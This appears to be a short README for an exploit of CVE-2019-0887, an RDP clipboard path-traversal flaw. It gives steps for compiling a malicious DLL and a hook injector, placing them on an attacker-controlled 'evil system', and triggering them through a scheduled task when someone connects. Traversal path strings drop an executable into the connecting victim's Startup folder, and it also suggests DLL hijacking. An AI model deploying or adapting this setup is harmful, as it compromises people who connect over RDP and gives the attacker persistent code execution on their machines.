# CVE-2019-0887

Compile the CVE-2019-0887, rename to `winhlp.dll`

Compile the Install_Hook, rename to `hook.exe`

> be careful, they must be compile with x64

Put then into the evil system just like that
```bash
c:\windows\hook.exe
c:\windows\winhlp.dll

c:\windows\winhlp64.exe # something evil 
```

if somebody want to change the path, there is the point
```bash
# CVE-2019-0887/dllmain.cpp
WCHAR  evalfile[] = { L"C:\\windows\\winhlp64.exe" };
WCHAR  efile[] = { L"C:\\windows\\system32\\..\\..\\..\\..\\..\\../AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/winhlp32.exe" };

# Install_Hook/ConsoleApplication.cpp
LoadDll(pid, "C:\\Windows\\winhlp.dll");
```

Maybe use taskschd.msc to create a Task Plan, set a Trigger "On connection to user session" and set the filepath of hook.exe.

Waiting some guys connect to my evil system, copy something, and pwn...

> Tips: Why not use DLL hijack?
